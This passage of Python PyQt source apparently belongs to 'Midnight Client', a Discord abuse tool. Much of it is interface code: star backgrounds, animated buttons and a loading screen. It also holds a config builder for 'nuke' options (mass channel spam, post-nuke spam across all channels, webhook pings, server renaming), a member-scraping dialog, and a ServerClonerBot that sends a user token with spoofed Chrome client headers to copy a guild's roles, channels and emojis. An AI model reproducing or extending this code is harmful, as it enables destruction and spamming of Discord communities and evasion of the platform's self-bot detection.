        layout = QHBoxLayout(widget)
        layout.setContentsMargins(20, 5, 0, 5)

        label = QLabel(label_text)
        label.setStyleSheet("color: white; background:transparent;")

        slider = AnimatedSlider(Qt.Orientation.Horizontal)
        slider.setRange(min_val, max_val)
        slider.setValue(initial_val)

        value_label = QLabel(f"{initial_val}")
        value_label.setStyleSheet("color: white; background:transparent; min-width: 25px;")

        slider.valueChanged.connect(lambda v, lbl=value_label: lbl.setText(f"{v}"))

        layout.addWidget(label)
        layout.addWidget(slider)
        layout.addWidget(value_label)
        widget.slider = slider
        return widget

    def get_config(self):
        config = {"destruction_options": {}}
        all_checks = {**self.destruction_checks, **self.creation_checks, **self.advanced_checks}
        for key, check in all_checks.items():
            config["destruction_options"][key] = check.isChecked()
        if config["destruction_options"].get("create_spam"):
            config["channel_creation_duration"] = self.create_duration_widget.slider.value()
        if config["destruction_options"].get("spam_all_channels_post_nuke") or config["destruction_options"].get(
                "use_webhook_ping"):
            config["post_nuke_spam_count"] = self.post_nuke_spam_widget.slider.value()

        if config["destruction_options"].get("rename_server"):
            config["custom_server_name"] = self.custom_server_name_input.text().strip()
            config["server_pfp_path"] = self.pfp_path_input.text().strip()

        return config






class AnimatedBackground(QWidget):
    def __init__(self, parent=None, borderRadius=12):
        super().__init__(parent)
        self.borderRadius = borderRadius
        # Fixed: Renamed back to 'star_colors' to match MainGUI expectations
        self.star_colors = [
            QColor(255, 255, 255),
            QColor(180, 200, 255),
            QColor(255, 220, 180),
            QColor(200, 255, 200)
        ]
        self.stars = []
        self.cache_pixmap = None  # Variable to store the pre-rendered background
        self.init_stars()

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_animation)
        # 30ms = ~33.3 FPS (Optimized Frame Rate)
        self.timer.start(30)

    def init_stars(self):
        current_width = self.width() if self.width() > 0 else 900
        current_height = self.height() if self.height() > 0 else 650
        self.stars = []
        for _ in range(200):
            x = random.randint(0, current_width)
            y = random.randint(0, current_height)
            color_index = random.randint(0, len(self.star_colors) - 1)
            self.stars.append(Star(x, y, color_index))

    def update_animation(self):
        # Only update the math properties here
        for star in self.stars:
            star.update()
        self.update() # Trigger a repaint

    def update_star_color(self, index: int, new_color: QColor):
        if 0 <= index < len(self.star_colors):
            self.star_colors[index] = new_color
            self.update()

    def _update_background_cache(self):
        """
        OPTIMIZATION: Renders the heavy gradient into a static image (QPixmap).
        This runs ONLY when the window is resized, not every frame.
        """
        self.cache_pixmap = QPixmap(self.size())
        self.cache_pixmap.fill(Qt.GlobalColor.transparent)
        
        painter = QPainter(self.cache_pixmap)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        
        gradient = QLinearGradient(0, 0, 0, self.height())
        gradient.setColorAt(0, QColor(8, 12, 20, 255))
        gradient.setColorAt(0.3, QColor(12, 16, 28, 255))
        gradient.setColorAt(0.7, QColor(6, 10, 18, 255))
        gradient.setColorAt(1, QColor(4, 6, 12, 255))
        
        painter.fillRect(self.rect(), gradient)
        painter.end()

    def resizeEvent(self, event):
        self.init_stars()
        self._update_background_cache() # Re-generate cache on resize
        super().resizeEvent(event)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        # 1. Apply Rounded Corners (Clipping)
        if self.borderRadius > 0:
            clip_path = QPainterPath()
            clip_path.addRoundedRect(QRectF(self.rect()), self.borderRadius, self.borderRadius)
            painter.setClipPath(clip_path)

        # 2. Draw Cached Background
        # This is much faster than calculating the gradient every frame
        if self.cache_pixmap:
            painter.drawPixmap(0, 0, self.cache_pixmap)
        else:
            painter.fillRect(self.rect(), QColor(8, 12, 20))

        # 3. Draw Stars
        # We use a reusable QColor object to avoid garbage collection overhead
        draw_col = QColor()

        for star in self.stars:
            base_col = self.star_colors[star.color_index]
            
            # Apply base RGB values to our reusable color object
            draw_col.setRgb(base_col.red(), base_col.green(), base_col.blue())

            # --- LAYER 1: GLOW (The larger, faint circle) ---
            x_glow = int(star.x - 1)
            y_glow = int(star.y - 1)
            s_glow = int(star.size + 2)
            
            # Set Alpha
            draw_col.setAlpha(int(star.opacity * 60))
            
            # CRITICAL: Set BOTH Pen and Brush. 
            # Keeping Pen ensures the size matches the original look exactly.
            painter.setPen(draw_col)
            painter.setBrush(draw_col) 
            painter.drawEllipse(x_glow, y_glow, s_glow, s_glow)

            # --- LAYER 2: CORE (The smaller, bright circle) ---
            x_core = int(star.x)
            y_core = int(star.y)
            s_core = int(star.size)

            # Set Alpha
            draw_col.setAlpha(int(star.opacity * 255))
            
            painter.setPen(draw_col)
            painter.setBrush(draw_col)
            painter.drawEllipse(x_core, y_core, s_core, s_core)
            
class AnimatedButton(QPushButton):
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.animation = QPropertyAnimation(self, b"geometry", self)
        self.animation.setDuration(100)
        self.animation.setEasingCurve(QEasingCurve.Type.OutCubic)
        self.original_geometry = QRect()
        self.pressed.connect(self._animate_press)
        self.released.connect(self._animate_release)
    def _animate_press(self):
        self.original_geometry = self.geometry()
        scale_factor = 0.98
        new_width = int(self.width() * scale_factor)
        new_height = int(self.height() * scale_factor)
        new_x = self.x() + (self.width() - new_width) // 2
        new_y = self.y() + (self.height() - new_height) // 2

        self.animation.setStartValue(self.original_geometry)
        self.animation.setEndValue(QRect(new_x, new_y, new_width, new_height))
        self.animation.start()
    def _animate_release(self):
        self.animation.setStartValue(self.geometry())
        self.animation.setEndValue(self.original_geometry)
        self.animation.start()
class MinimalButton(AnimatedButton):
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setFixedHeight(48)
        self.setFont(QFont("Segoe UI", 11, QFont.Weight.Normal))

        self.setStyleSheet("""
            QPushButton {
                background: transparent;
                border: 1px solid rgba(255, 255, 255, 0.2);
                border-radius: 8px;
                color: rgba(255, 255, 255, 0.9);
                font-weight: 400;
                letter-spacing: 0.3px;
                padding: 0px 24px;
                transition: background 0.15s ease-out, border-color 0.15s ease-out, color 0.15s ease-out;
            }
            QPushButton:hover {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.3);
                color: white;
            }
            QPushButton:pressed {
                background: rgba(255, 255, 255, 0.1);
                border: 1px solid rgba(255, 255, 255, 0.4);
            }
            QPushButton:disabled {
                background: transparent;
                border: 1px solid rgba(255, 255, 255, 0.1);
                color: rgba(255, 255, 255, 0.4);
            }
        """)

class AnimatedGradientButton(MinimalButton):
    """A highly optimized button with a perfectly seamless side-to-side gradient and a smooth fade to a lighter state on hover."""
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self._gradient_offset = 0.0  
        self._hover_progress = 0.0   


        self.normal_bright = QColor("#C53030") 
        self.normal_dark = QColor("#000000")      
        self.normal_border = QColor("#8B0000")    
        
        self.hover_bright = QColor("#FF8585")   
        self.hover_dark = QColor("#7E2217")     
        self.hover_border = QColor("#FF7373")   

        self.button_font = self.font()
        self.button_font.setBold(True)
        self.text_pen = QPen(QColor("white"))
        self.slide_animation = QPropertyAnimation(self, b"gradientOffset")
        self.slide_animation.setStartValue(0.0)
        self.slide_animation.setEndValue(1.0)
        self.slide_animation.setDuration(3000)
        self.slide_animation.setLoopCount(-1)
        self.slide_animation.start()
        self.hover_animation = QPropertyAnimation(self, b"hoverProgress")
        self.hover_animation.setDuration(200)
        self.hover_animation.setEasingCurve(QEasingCurve.Type.OutCubic)
        self.hover_animation.setStartValue(0.0) 
        self.hover_animation.setEndValue(1.0)   

    @pyqtProperty(float)
    def gradientOffset(self):
        return self._gradient_offset

    @gradientOffset.setter
    def gradientOffset(self, value):
        self._gradient_offset = value
        self.update()

    @pyqtProperty(float)
    def hoverProgress(self):
        return self._hover_progress

    @hoverProgress.setter
    def hoverProgress(self, value):
        self._hover_progress = value
        self.update()

    def enterEvent(self, event):
        self.hover_animation.setDirection(QPropertyAnimation.Direction.Forward)
        if self.hover_animation.state() != QPropertyAnimation.State.Running:
            self.hover_animation.start()
        super().enterEvent(event)

    def leaveEvent(self, event):
        self.hover_animation.setDirection(QPropertyAnimation.Direction.Backward)
        if self.hover_animation.state() != QPropertyAnimation.State.Running:
            self.hover_animation.start()
        super().leaveEvent(event)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        rect = self.rect()
        
        progress = self.hoverProgress
        def lerp_color(c1, c2, t):
            r = int(c1.red() * (1.0 - t) + c2.red() * t)
            g = int(c1.green() * (1.0 - t) + c2.green() * t)
            b = int(c1.blue() * (1.0 - t) + c2.blue() * t)
            return QColor(r, g, b)

        current_bright = lerp_color(self.normal_bright, self.hover_bright, progress)
        current_dark = lerp_color(self.normal_dark, self.hover_dark, progress)
        current_border = lerp_color(self.normal_border, self.hover_border, progress)

        painter.save() 

        gradient = QLinearGradient(0, 0, self.width(), 0)
        gradient.setColorAt(0.0, current_dark)
        gradient.setColorAt(0.5, current_bright)
        gradient.setColorAt(1.0, current_dark)
        gradient.setSpread(QGradient.Spread.RepeatSpread)

        translate_offset = self._gradient_offset * self.width() * 2
        painter.translate(-translate_offset, 0)
        
        painter.setBrush(QBrush(gradient))
        painter.setPen(QPen(current_border, 1))
        painter.drawRoundedRect(rect.translated(int(translate_offset), 0), 8.0, 8.0)
        
        painter.restore() 

        painter.setPen(self.text_pen)
        painter.setFont(self.button_font)
        painter.drawText(rect, Qt.AlignmentFlag.AlignCenter, self.text())
        




class LoadingScreen(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.username = None
        self.welcome_text = ""
        self.sub_text = ""
        self.rotation_angle1 = 0
        self.rotation_angle2 = 0
        self.rotation_angle3 = 0
        self.moon_rotation_angle = 0
        self.moon_radius = 50
        self.num_craters = 60

        # --- New Additions for Facts ---
        self.facts = [
            "The first edition of midnight client was developed in 2024.",
            "The animated background features over 200 twinkling stars.",
            "You can customize the star colors in the Settings tab.",
            "The Super Scan feature can find members faster then a normal scan but is less accurate.",
            "The AI Companion can be connected to your own local language models. - LM STUDIO",
            "Midnight client was gonna be named Astral before we thought of a name."

        ]
        self.fact_label = QLabel(self)
        self.fact_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.fact_label.setWordWrap(True)
        self.fact_label.setStyleSheet("color: rgba(255, 255, 255, 0.4); font-size: 11px; background: transparent;")
        
        self.fact_opacity_effect = QGraphicsOpacityEffect(self.fact_label)
        self.fact_label.setGraphicsEffect(self.fact_opacity_effect)
        
        self.fact_animation_group = QParallelAnimationGroup(self)

        self.fact_timer = QTimer(self)
        self.fact_timer.timeout.connect(self.change_fact)
        # --- End of New Additions ---

        self.animation_timer = QTimer(self)
        self.animation_timer.timeout.connect(self.update_animation)
        self.animation_timer.start(25)

        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setStyleSheet("background: transparent;")

        self.craters = []
        self._init_craters()

        # Initialize and start the fact cycler
        self.change_fact(first_time=True)
        self.fact_timer.start(2000) # Change fact every 5 seconds

    def set_user(self, username):
        """Sets the username to be displayed on the loading screen."""
        randomgreet = random.choice(["What's up,", "Nice to see you,", "Looking cool,", "Thanks for using Midnight Client,"])
        self.username = username
        if username:
            self.welcome_text = f"{randomgreet} {username}"
            self.sub_text = ""
        else:
            self.welcome_text = ""
            self.sub_text = ""
        self.update()

    def _init_craters(self):
        self.craters = []
        for _ in range(self.num_craters):
            angle = random.uniform(0, 2 * math.pi)
            distance = random.uniform(self.moon_radius * 0.2, self.moon_radius * 0.95)
            size = random.uniform(self.moon_radius * 0.05, self.moon_radius * 0.3)
            depth = random.uniform(0.1, 0.7)

            self.craters.append({
                "x_offset": distance * math.cos(angle),
                "y_offset": distance * math.sin(angle),
                "size": size,
                "depth": depth
            })

    def update_animation(self):
        self.rotation_angle1 = (self.rotation_angle1 + 3) % 360
        self.rotation_angle2 = (self.rotation_angle2 - 2) % 360
        self.rotation_angle3 = (self.rotation_angle3 + 1) % 360
        self.moon_rotation_angle = (self.moon_rotation_angle + 0.1) % 360
        self.update()
        
    def resizeEvent(self, event):
        """Ensure the fact label is always positioned correctly."""
        super().resizeEvent(event)
        fact_width = self.width() * 0.8
        self.fact_label.setFixedWidth(int(fact_width))
        x = (self.width() - fact_width) / 2
        y = self.height() - 60 
        self.fact_label.move(int(x), int(y))

    def change_fact(self, first_time=False):
        """Handles the animation for changing facts."""
        if first_time:
            # On first run, just show a fact without animation
            new_fact = random.choice(self.facts)
            self.fact_label.setText(new_fact)
            self.fact_opacity_effect.setOpacity(1.0)
            return

        # Start a fade-out animation
        fade_out = QPropertyAnimation(self.fact_opacity_effect, b"opacity")
        fade_out.setDuration(400)
        fade_out.setStartValue(1.0)
        fade_out.setEndValue(0.0)
        fade_out.setEasingCurve(QEasingCurve.Type.InQuad)
        
        # When fade-out is done, trigger the fade-in
        fade_out.finished.connect(self._transition_to_new_fact)
        fade_out.start(QPropertyAnimation.DeletionPolicy.DeleteWhenStopped)

    def _transition_to_new_fact(self):
        """Sets the new fact text and starts the fade-in/slide-down animation."""
        current_fact = self.fact_label.text()
        possible_facts = [f for f in self.facts if f != current_fact]
        new_fact = random.choice(possible_facts)
        self.fact_label.setText(new_fact)

        # Define start and end positions for the slide
        final_y = self.height() - 60
        start_y = final_y - 15 
        start_pos = QPoint(self.fact_label.x(), start_y)
        end_pos = QPoint(self.fact_label.x(), final_y)

        # Create animations
        fade_in = QPropertyAnimation(self.fact_opacity_effect, b"opacity")
        fade_in.setDuration(500)
        fade_in.setStartValue(0.0)
        fade_in.setEndValue(1.0)
        fade_in.setEasingCurve(QEasingCurve.Type.OutQuad)

        slide_down = QPropertyAnimation(self.fact_label, b"pos")
        slide_down.setDuration(500)
        slide_down.setStartValue(start_pos)
        slide_down.setEndValue(end_pos)
        slide_down.setEasingCurve(QEasingCurve.Type.OutCubic)

        # Group them to run at the same time
        self.fact_animation_group = QParallelAnimationGroup(self)
        self.fact_animation_group.addAnimation(fade_in)
        self.fact_animation_group.addAnimation(slide_down)
        self.fact_animation_group.start(QPropertyAnimation.DeletionPolicy.DeleteWhenStopped)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        center_x = self.width() // 2
        center_y = self.height() // 2

        # Draw welcome message if a user is set
        if self.welcome_text:
            painter.save()
            welcome_font = QFont("Segoe UI", 16, QFont.Weight.Bold)
            painter.setFont(welcome_font)
            painter.setPen(QColor(255, 255, 255, 220))
            metrics = painter.fontMetrics()
            text_width = metrics.horizontalAdvance(self.welcome_text)
            painter.drawText(center_x - text_width // 2, center_y - self.moon_radius - 120, self.welcome_text)

            if self.sub_text:
                sub_font = QFont("Segoe UI", 10)
                painter.setFont(sub_font)
                painter.setPen(QColor(255, 255, 255, 180))
                metrics = painter.fontMetrics()
                sub_width = metrics.horizontalAdvance(self.sub_text)
                painter.drawText(center_x - sub_width // 2, center_y - self.moon_radius - 95, self.sub_text)
            painter.restore()

        painter.save()
        painter.translate(center_x, center_y)
        painter.rotate(self.moon_rotation_angle)

        moon_gradient = QRadialGradient(0, 0, self.moon_radius)
        moon_gradient.setColorAt(0, QColor(200, 200, 200))
        moon_gradient.setColorAt(0.6, QColor(150, 150, 150))
        moon_gradient.setColorAt(1, QColor(100, 100, 100))

        painter.setBrush(QBrush(moon_gradient))
        painter.setPen(Qt.PenStyle.NoPen)
        painter.drawEllipse(-self.moon_radius, -self.moon_radius,
                            self.moon_radius * 2, self.moon_radius * 2)

        for crater in self.craters:
            crater_x = crater["x_offset"]
            crater_y = crater["y_offset"]
            crater_size = crater["size"]
            crater_depth = crater["depth"]

            dark_color = QColor(0, 0, 0, int(crater_depth * 100))
            painter.setBrush(QBrush(dark_color))
            painter.setPen(Qt.PenStyle.NoPen)
            painter.drawEllipse(int(crater_x - crater_size / 2), int(crater_y - crater_size / 2),
                                int(crater_size), int(crater_size))

            rim_color = QColor(255, 255, 255, int(crater_depth * 50))
            rim_size = crater_size * 0.7
            painter.setBrush(QBrush(rim_color))
            painter.drawEllipse(int(crater_x - rim_size / 2 + crater_size * 0.1),
                                int(crater_y - rim_size / 2 + crater_size * 0.1),
                                int(rim_size), int(rim_size))
        painter.restore()

        painter.setBrush(QBrush())
        painter.setPen(QPen(QColor(99, 179, 237), 3))

        loading_arc_radius_1 = self.moon_radius + 30
        arc_rect_1 = QRect(center_x - loading_arc_radius_1, center_y - loading_arc_radius_1,
                           loading_arc_radius_1 * 2, loading_arc_radius_1 * 2)
        painter.drawArc(arc_rect_1, self.rotation_angle1 * 16, 90 * 16)

        loading_arc_radius_2 = self.moon_radius + 50
        arc_rect_2 = QRect(center_x - loading_arc_radius_2, center_y - loading_arc_radius_2,
                           loading_arc_radius_2 * 2, loading_arc_radius_2 * 2)
        painter.setPen(QPen(QColor(150, 180, 255, 180), 2))
        painter.drawArc(arc_rect_2, self.rotation_angle2 * 16, 120 * 16)

        loading_arc_radius_3 = self.moon_radius + 70
        arc_rect_3 = QRect(center_x - loading_arc_radius_3, center_y - loading_arc_radius_3,
                           loading_arc_radius_3 * 2, loading_arc_radius_3 * 2)
        painter.setPen(QPen(QColor(200, 220, 255, 150), 1))
        painter.drawArc(arc_rect_3, self.rotation_angle3 * 16, 150 * 16)





    



class MemberScanConfigDialog(StyledDialog):
    def __init__(self, parent=None):
        super().__init__("Scan Configuration", parent)
        # FIX 1: Increased minimum height from 350 to 400 to fit the input box
        self.setMinimumSize(400, 400)
        
        container = QFrame()
        container.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(container)
        layout.setContentsMargins(25, 15, 25, 25)
        layout.setSpacing(15)

        # --- Header ---
        info_label = QLabel("Configure Scan Limit")
        info_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        info_label.setStyleSheet("color: white; font-size: 18px; font-weight: bold;")
        layout.addWidget(info_label)

        desc_label = QLabel("Set a specific number of members to fetch, or let it run until the end.")
        desc_label.setWordWrap(True)
        desc_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        desc_label.setStyleSheet("color: #A0AEC0; font-size: 12px;")
        layout.addWidget(desc_label)

        # --- Options Container ---
        options_frame = QFrame()
        options_frame.setStyleSheet("background: rgba(255, 255, 255, 0.05); border-radius: 8px;")
        options_layout = QVBoxLayout(options_frame)
        options_layout.setSpacing(15) # Increased spacing
        options_layout.setContentsMargins(15, 15, 15, 15)

        # Radio Buttons
        self.radio_auto = QRadioButton("Auto-Detect (Scan All)")
        self.radio_auto.setChecked(True)
        self.radio_auto.setStyleSheet("""
            QRadioButton { color: white; font-size: 14px; }
            QRadioButton::indicator { width: 16px; height: 16px; border-radius: 8px; border: 2px solid #718096; }
            QRadioButton::indicator:checked { background-color: #63b3ed; border-color: #63b3ed; }
        """)
        
        self.radio_custom = QRadioButton("Set Custom Goal")
        self.radio_custom.setStyleSheet(self.radio_auto.styleSheet())

        options_layout.addWidget(self.radio_auto)
        options_layout.addWidget(self.radio_custom)

        # Custom Input (Initially Hidden)
        self.custom_input_widget = QWidget()
        # FIX 2: Gave the widget a minimum height so it doesn't collapse
        self.custom_input_widget.setMinimumHeight(60) 
        input_layout = QVBoxLayout(self.custom_input_widget)
        input_layout.setContentsMargins(20, 0, 0, 0)
        input_layout.setSpacing(5)
        
        lbl_hint = QLabel("Stop after finding:")
        lbl_hint.setStyleSheet("color: #A0AEC0; font-size: 11px;")
        
        self.limit_spinbox = QSpinBox()
        self.limit_spinbox.setRange(1, 10000000)
        self.limit_spinbox.setValue(1000)
        self.limit_spinbox.setSuffix(" members")
        self.limit_spinbox.setFixedHeight(40)
        self.limit_spinbox.setStyleSheet("""
            QSpinBox { 
                background: rgba(0, 0, 0, 0.3); 
                border: 1px solid #4A5568; 
                border-radius: 5px; 
                color: white; 
                padding-left: 10px;
                font-size: 13px;
            }
            QSpinBox:focus { border: 1px solid #63b3ed; }
        """)
        
        input_layout.addWidget(lbl_hint)
        input_layout.addWidget(self.limit_spinbox)
        options_layout.addWidget(self.custom_input_widget)
        
        # Logic to show/hide input
        self.custom_input_widget.setVisible(False)
        self.radio_auto.toggled.connect(self.toggle_input)
        self.radio_custom.toggled.connect(self.toggle_input)

        layout.addWidget(options_frame)
        layout.addStretch()

        # --- Buttons ---
        btn_layout = QHBoxLayout()
        
        cancel_btn = MinimalButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        
        start_btn = MinimalButton("START SCAN")
        start_btn.setStyleSheet("""
            QPushButton { background: rgba(72, 187, 120, 0.2); border: 1px solid rgba(72, 187, 120, 0.5); color: white; font-weight: bold; }
            QPushButton:hover { background: rgba(72, 187, 120, 0.3); }
        """)
        start_btn.clicked.connect(self.accept)

        btn_layout.addWidget(cancel_btn)
        btn_layout.addWidget(start_btn)
        layout.addLayout(btn_layout)

        self.content_layout.addWidget(container)

    def toggle_input(self):
        show = self.radio_custom.isChecked()
        self.custom_input_widget.setVisible(show)
        # FIX 3: Force the dialog to resize to fit the new content
        if show:
            self.setMinimumHeight(450)
        else:
            self.setMinimumHeight(400)

    def get_limit(self):
        if self.radio_auto.isChecked():
            return 0 
        return self.limit_spinbox.value()




class ColorPicker(QWidget):
    colorChanged = pyqtSignal(QColor)

    def __init__(self, label_text: str, main_window, parent=None):
        super().__init__(parent)
        self.main_window = main_window
        self.current_color = QColor(255, 255, 255)

        layout = QHBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(10)
        layout.setAlignment(Qt.AlignmentFlag.AlignLeft)

        label = QLabel(label_text)
        label.setStyleSheet("color: white; font-size: 12px; font-weight: 500; background: transparent;")
        label.setMinimumWidth(120)
        label.setSizePolicy(QSizePolicy.Policy.Fixed, QSizePolicy.Policy.Preferred)

        self.color_preview = AnimatedButton("")
        self.color_preview.setFixedSize(40, 30)
        self.color_preview.clicked.connect(self.open_color_dialog)
        self.update_color_preview()

        layout.addWidget(label)
        layout.addWidget(self.color_preview)
        layout.addStretch(1)

        self.setStyleSheet("background: transparent;")

    def update_color_preview(self):
        self.color_preview.setStyleSheet(f"""
            QPushButton {{
                background-color: rgb({self.current_color.red()}, {self.current_color.green()}, {self.current_color.blue()});
                border: 1px solid rgba(255, 255, 255, 0.4);
                border-radius: 4px;
                transition: border-color 0.15s ease-out;
            }}
            QPushButton:hover {{
                border: 1px solid rgba(255, 255, 255, 0.6);
            }}
            QPushButton:pressed {{
                border: 1px solid rgba(99, 179, 237, 0.8);
            }}
        """)


    def open_color_dialog(self):
        dialog = ModernColorPickerDialog(self.current_color, self.main_window)
        
        if dialog.exec() == QDialog.DialogCode.Accepted:
            color = dialog.currentColor()
            if color.isValid():
                self.current_color = color
                self.update_color_preview()
                self.colorChanged.emit(self.current_color)

class SideNavigationButton(AnimatedButton):
    def __init__(self, text: str, parent=None):
        super().__init__(text, parent)
        self.setFixedSize(180, 45)
        self.setFont(QFont("Segoe UI", 12, QFont.Weight.Medium))
        self.setCheckable(True)

        self.setStyleSheet("""
            QPushButton {
                background: transparent;
                border: none;
                color: rgba(255, 255, 255, 0.7);
                text-align: left;
                padding-left: 20px;
                border-radius: 8px;
                transition: background 0.15s ease-out, color 0.15s ease-out, border-left 0.15s ease-out;
            }
            QPushButton:hover {
                background: rgba(255, 255, 255, 0.1);
                color: white;
            }
            QPushButton:checked {
                background: rgba(99, 179, 237, 0.2);
                color: white;
                border-left: 3px solid rgba(99, 179, 237, 0.8);
            }
            QPushButton:pressed {
                background: rgba(255, 255, 255, 0.15);
            }
        """)
class TabButton(AnimatedButton):
    def __init__(self, text: str, parent=None):
        super().__init__(text, parent)
        self.setCheckable(True)
        self.setFont(QFont("Segoe UI", 11, QFont.Weight.Medium))
        self.setFixedSize(120, 40)
        self.setStyleSheet("""
            TabButton {
                background: transparent;
                border: 1px solid transparent;
                border-bottom-color: transparent;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                color: rgba(255, 255, 255, 0.7);
                padding: 0px 10px;
                transition: background 0.15s ease-out, color 0.15s ease-out, border-color 0.15s ease-out;
            }
            TabButton:hover:!checked {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-bottom-color: transparent;
                color: white;
            }
            TabButton:checked {
                background: rgba(26, 32, 44, 0.7);
                border-color: rgba(255, 255, 255, 0.2);
                border-bottom-color: rgba(26, 32, 44, 0.7);
                color: white;
            }
            TabButton:pressed {
                background: rgba(255, 255, 255, 0.1);
            }
        """)
class ServerClonerBot(QThread):
    update_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(bool, str, QPushButton)  
    log_data_signal = pyqtSignal(dict)  
    def __init__(self, token, initiating_button: QPushButton = None):
        super().__init__()
        self.token = token
        self.is_bot = False 
                # --- MISSING SESSION FIX ---
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        # ---------------------------
        self.running = False
        self.mode = ""
        self.initiating_button = initiating_button  
        self.source_guild_id = None
        self.target_guild_id = None
        self.cloned_data = {}  # Will hold the logged server data
        self.category_map = {}
        self.global_delay = 1.0
        self.last_request_time = 0
        self.request_count = 0
        self.api_version = "v9"
    def get_headers(self):
        headers = {
            "Authorization": self.token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "X-Super-Properties": base64.b64encode(json.dumps({
                "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "en-US",
                "browser_user_agent": "Mozilla/50 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "browser_version": "91.0.4472.124", "os_version": "10", "release_channel": "stable",
                "client_build_number": 99999,
            }).encode()).decode()
        }
        return headers

    def make_request(self, method, url, **kwargs):
        local_kwargs = kwargs.copy()
        headers = local_kwargs.pop('headers', self.get_headers())

        if not headers: return None

        for attempt in range(3):
            try:
                self.smart_delay()
                
                # Use self.session.request instead of requests.request
                response = self.session.request(method, url, headers=headers, timeout=15, **local_kwargs)
                
                if response.status_code == 429:
                    retry_after = float(response.headers.get('Retry-After', 1.5))
                    wait_time = min(retry_after, 3.0)  
                    self.update_signal.emit(f"Rate limited. Waiting {wait_time:.2f}s...")
                    time.sleep(wait_time)
                    continue
                if response.status_code == 403:
                    self.update_signal.emit(f"403 Forbidden: Check token permissions for {url}")
                    return None
                if response.status_code >= 400:
                    self.update_signal.emit(f"Request failed ({response.status_code}) on {url}")
                    return None
                return response
            except requests.exceptions.RequestException as e:
                self.update_signal.emit(f"Request failed (attempt {attempt + 1}/3): {str(e)}")
                time.sleep(2 ** attempt)
        return None


    def smart_delay(self):
        time.sleep(self.global_delay + random.uniform(0.1, 0.5))
    def run(self):
        self.running = True
        try:
            if self.mode == "log":
                self.log_server()
            elif self.mode == "perfect_clone":
                self.perfect_clone()
            elif self.mode == "perfect_perfect_clone":
                self.perfect_perfect_clone()
        except Exception as e:
            self.update_signal.emit(f"[❌] CRITICAL Cloner ERROR: {e}")
            traceback.print_exc()
            self.finished_signal.emit(False, f"A critical error occurred: {e}", self.initiating_button)
        finally:
            self.running = False
    def stop(self):
        self.running = False
    def log_server(self):
        self.update_signal.emit(f"Starting to log server: {self.source_guild_id}")
        headers = self.get_headers()
        guild_response = self.make_request("GET",
                                           f"https://discord.com/api/{self.api_version}/guilds/{self.source_guild_id}",
                                           headers=headers)
        if not guild_response or guild_response.status_code != 200:
            self.finished_signal.emit(False, "Failed to fetch server info.", self.initiating_button)
            return
        guild_info = guild_response.json()
        self.update_signal.emit(f"Fetched server info for: {guild_info.get('name')}")

        roles_response = self.make_request("GET",
                                           f"https://discord.com/api/{self.api_version}/guilds/{self.source_guild_id}/roles",
                                           headers=headers)
        roles = roles_response.json() if roles_response else []
        self.update_signal.emit(f"Fetched {len(roles)} roles.")

        channels_response = self.make_request("GET",
                                              f"https://discord.com/api/{self.api_version}/guilds/{self.source_guild_id}/channels",
                                              headers=headers)
        raw_channels = channels_response.json() if channels_response else []
        self.update_signal.emit(f"Fetched {len(raw_channels)} channels.")

        emojis_response = self.make_request("GET",
                                            f"https://discord.com/api/{self.api_version}/guilds/{self.source_guild_id}/emojis",
                                            headers=headers)
        emojis = emojis_response.json() if emojis_response else []
        self.update_signal.emit(f"Fetched {len(emojis)} emojis.")

        stickers_response = self.make_request("GET",
                                              f"https://discord.com/api/{self.api_version}/guilds/{self.source_guild_id}/stickers",
                                              headers=headers)
        stickers = stickers_response.json() if stickers_response else []
        self.update_signal.emit(f"Fetched {len(stickers)} stickers.")

        if len(raw_channels) >= 490:
            self.update_signal.emit(
                f"[⚠️] WARNING: Source server has {len(raw_channels)} channels, which is close to or exceeds Discord's 500-channel limit. Cloning may fail or be incomplete.")

        channel_map = {c['id']: c for c in raw_channels}
        category_children = {}
        for ch_id, ch_data in channel_map.items():
            parent_id = ch_data.get('parent_id')
            if parent_id:
                if parent_id not in category_children:
                    category_children[parent_id] = []
                category_children[parent_id].append(ch_data)

        for parent_id in category_children:
            category_children[parent_id].sort(key=lambda x: x.get('position', 0))

        top_level_items = []
        for ch_id, ch_data in channel_map.items():
            if ch_data['type'] == 4:
                ch_data['children'] = category_children.get(ch_id, [])
                top_level_items.append(ch_data)
            elif not ch_data.get('parent_id'):
                top_level_items.append(ch_data)

        organized_channels = sorted(top_level_items, key=lambda x: x.get('position', 0))

        self.cloned_data = {
            "metadata": {"name": guild_info.get('name'), "id": self.source_guild_id,
                         "timestamp": datetime.now().isoformat()},
            "guild_info": guild_info, "roles": roles, "channels": organized_channels,
            "emojis": emojis, "stickers": stickers
        }
        self.log_data_signal.emit(self.cloned_data)
